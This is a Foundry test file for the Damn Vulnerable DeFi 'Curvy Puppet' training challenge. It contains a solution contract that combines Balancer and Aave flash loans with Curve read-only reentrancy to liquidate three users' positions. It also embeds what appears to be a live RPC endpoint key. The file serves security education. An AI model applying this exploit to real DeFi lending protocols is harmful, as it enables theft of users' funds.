// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

interface IAaveLendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ILido {
    function submit(address _referral) external payable returns (uint256);
    function withdraw(uint256 amount, address receiver) external;
}

interface IEulerDToken {
    function flashLoan(uint256 amount, bytes calldata data) external;
}

interface IBalancer {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 =
        IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool =
        IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth =
        WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork(
            (
                "https://spring-virulent-liquid.quiknode.pro/6dd3d7f3a29ceb02b2e8d24ec3d7e146ff915cb4"
            ),
            20190356
        );

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({
            asset: ETH,
            value: ETHER_PRICE,
            expiration: block.timestamp + 1 days
        });
        oracle.setPrice({
            asset: address(dvt),
            value: DVT_PRICE,
            expiration: block.timestamp + 1 days
        });

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(
            address(lending),
            LENDER_INITIAL_LP_BALANCE
        );
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(
            IERC20(curvePool.lp_token()).balanceOf(treasury),
            TREASURY_LP_BALANCE
        );

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(
                lending.getCollateralValue(collateralAmount) /
                    lending.getBorrowValue(borrowAmount),
                3
            );
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        Hack hack = new Hack(
            address(lending),
            address(weth),
            address(dvt),
            address(curvePool),
            address(permit2),
            alice,
            bob,
            charlie,
            treasury
        );
        weth.transferFrom(treasury, address(hack), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(
            treasury,
            address(hack),
            TREASURY_LP_BALANCE
        );
        hack.attack1();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(
                lending.getCollateralAmount(users[i]),
                0,
                "User position still has collateral assets"
            );
            assertEq(
                lending.getBorrowAmount(users[i]),
                0,
                "User position still has borrowed assets"
            );
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(
            IERC20(curvePool.lp_token()).balanceOf(treasury),
            0,
            "Treasury doesn't have any LP tokens left"
        );
        assertEq(
            dvt.balanceOf(treasury),
            USER_INITIAL_COLLATERAL_BALANCE * 3,
            "Treasury doesn't have the users' DVT"
        );

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(
            IERC20(curvePool.lp_token()).balanceOf(player),
            0,
            "Player still has LP tokens"
        );
    }
}

contract Hack {
    CurvyPuppetLending lending;
    WETH weth;
    DamnValuableToken dvt;
    IStableSwap curvePool;
    IPermit2 permit2;
    address alice;
    address bob;
    address charlie;
    address treasury;
    IERC20 lptoken;
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    address public constant AAVE_LENDING_POOL =
        0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant balancerAddress =
        0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant dTokenAddress = 0x62e28f054efc24b26A794F5C1249B6349454352C;
    IEulerDToken constant dToken = IEulerDToken(dTokenAddress);

    constructor(
        address _lending,
        address _weth,
        address _dvt,
        address _curvePool,
        address _permit2,
        address _alice,
        address _bob,
        address _charlie,
        address _treasury
    ) {
        lending = CurvyPuppetLending(_lending);
        weth = WETH(payable(_weth));
        dvt = DamnValuableToken(_dvt);
        curvePool = IStableSwap(_curvePool);
        permit2 = IPermit2(_permit2);
        alice = _alice;
        bob = _bob;
        charlie = _charlie;
        treasury = _treasury;
        lptoken = IERC20(curvePool.lp_token());
    }
    function attack1() external {
        IBalancer balancer = IBalancer(balancerAddress);
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 37991 ether;
        balancer.flashLoan(address(this), tokens, amounts, "");
        console.log(address(this).balance);
        console.log(weth.balanceOf(address(this)));
        console.log(stETH.balanceOf(address(this)));
        weth.transfer(treasury, 1);
        lptoken.transfer(treasury, 1);
        dvt.transfer(treasury, dvt.balanceOf(address(this)));
    }

    function receiveFlashLoan(
        IERC20[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata /* feeAmounts */,
        bytes calldata /* userData */
    ) public payable {
        if (msg.sender != balancerAddress) revert();
        attack2();
    }

    function attack2() public {
        lptoken.approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: address(lptoken),
            spender: address(lending),
            amount: type(uint160).max,
            expiration: uint48(block.timestamp)
        });
        address[] memory tokens = new address[](2);
        tokens[0] = address(weth);
        tokens[1] = address(stETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 20500 ether;
        amounts[1] = 172000 ether;
        console.log(curvePool.get_virtual_price());
        //balancer.flashLoan(address(this), tokens, amounts, "");
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        // 调用 Aave 的闪电贷函数
        IAaveLendingPool(AAVE_LENDING_POOL).flashLoan(
            address(this), // 接收闪电贷的合约地址
            tokens, // 借入的资产列表
            amounts, // 借入的金额列表
            modes, // 模式列表
            address(this), // 还款地址
            "", // 额外参数
            0 // 推荐码
        );
        //lending.liquidate(alice);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata /* params */
    ) external returns (bool) {
        weth.withdraw(58685 ether);

        stETH.approve(address(curvePool), type(uint256).max);
        curvePool.add_liquidity{value: 58685 ether}({
            amounts: [58685 ether, stETH.balanceOf(address(this))],
            min_mint_amount: 0
        });
        //lending.liquidate(alice);
        curvePool.remove_liquidity(
            lptoken.balanceOf(address(this)) - 3 ether - 1,
            [uint256(0), uint256(0)]
        );

        uint256 repayAmountWETH = amounts[0] + premiums[0];
        uint256 repayAmountSTETH = amounts[1] + premiums[1];

        weth.deposit{value: 37991 ether}();
        weth.transfer(balancerAddress, 37991 ether);
        weth.approve(AAVE_LENDING_POOL, repayAmountWETH);
        uint256 ethAmount = 12963923469069977697655;
        uint256 min_dy = 1;
        console.log(weth.balanceOf(address(this)));
        console.log(address(this).balance);
        weth.deposit{value: 20518 ether}();
        curvePool.exchange{value: ethAmount}(0, 1, ethAmount, min_dy);

        if (repayAmountSTETH > stETH.balanceOf(address(this))) {
            ILido(address(stETH)).submit{
                value: repayAmountSTETH - stETH.balanceOf(address(this))
            }(address(this));
        }

        stETH.approve(AAVE_LENDING_POOL, repayAmountSTETH);
        return true;
    }
    receive() external payable {
        if (msg.sender == address(curvePool)) {
            console.log(lptoken.balanceOf(address(this)));
            console.log(curvePool.get_virtual_price());
            lending.liquidate(alice);
            lending.liquidate(bob);
            lending.liquidate(charlie);
        }
    }
}
